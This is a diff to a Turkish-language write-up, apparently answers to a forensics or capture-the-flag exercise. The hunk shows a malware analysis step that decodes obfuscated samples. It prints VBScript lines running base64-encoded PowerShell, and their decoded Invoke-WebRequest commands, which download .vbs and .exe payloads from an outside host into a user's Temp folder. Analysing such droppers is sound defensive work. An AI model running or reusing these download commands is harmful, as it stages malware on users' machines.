@@ -1423,19 +1423,19 @@ Hemen Decode edelim. Base64den çeviriyoruz ve Null Byte'ları temizliyoruz.
 ```Invoke-WebRequest -Uri http://ofbahar.com/BodyMassIndex.exe -OutFile C:\Users\RickMartinGrimes\AppData\Local\Temp\BodyMassIndex.exe```
 
 Cevap:
-```
-Undecoded:
+
+```Undecoded:```
 ```
     oshell.Run "powershell -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AbwBmAGIAYQBoAGEAcgAuAGMAbwBtAC8AbgBvAHQAYQBtAGEAbAB3AGEAcgBlAC4AdgBiAHMAIAAtAE8AdQB0AEYAaQBsAGUAIABDADoAXABVAHMAZQByAHMAXABSAGkAYwBrAE0AYQByAHQAaQBuAEcAcgBpAG0AZQBzAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABuAG8AdABhAG0AYQBsAHcAYQByAGUALgB2AGIAcwA="
     oshell.Run "powershell -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AbwBmAGIAYQBoAGEAcgAuAGMAbwBtAC8AYQBjAGMAZQBzAHMAdABvAGsAZQBuAC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABDADoAXABVAHMAZQByAHMAXABSAGkAYwBrAE0AYQByAHQAaQBuAEcAcgBpAG0AZQBzAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABBAGMAYwBlAHMAcwBUAG8AawBlAG4ALgBlAHgAZQA="
     oshell.Run "powershell -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AbwBmAGIAYQBoAGEAcgAuAGMAbwBtAC8AQgBvAGQAeQBNAGEAcwBzAEkAbgBkAGUAeAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVQBzAGUAcgBzAFwAUgBpAGMAawBNAGEAcgB0AGkAbgBHAHIAaQBtAGUAcwBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAQgBvAGQAeQBNAGEAcwBzAEkAbgBkAGUAeAAuAGUAeABlAA=="
 ```
 
-Decoded:
+```Decoded:```
 ```Invoke-WebRequest -Uri http://ofbahar.com/notamalware.vbs -OutFile C:\Users\RickMartinGrimes\AppData\Local\Temp\notamalware.vbs```
 ```Invoke-WebRequest -Uri http://ofbahar.com/accesstoken.exe -OutFile C:\Users\RickMartinGrimes\AppData\Local\Temp\AccessToken.exe```
 ```Invoke-WebRequest -Uri http://ofbahar.com/BodyMassIndex.exe -OutFile C:\Users\RickMartinGrimes\AppData\Local\Temp\BodyMassIndex.exe```
-```
+
 
 # 41. Soru
 
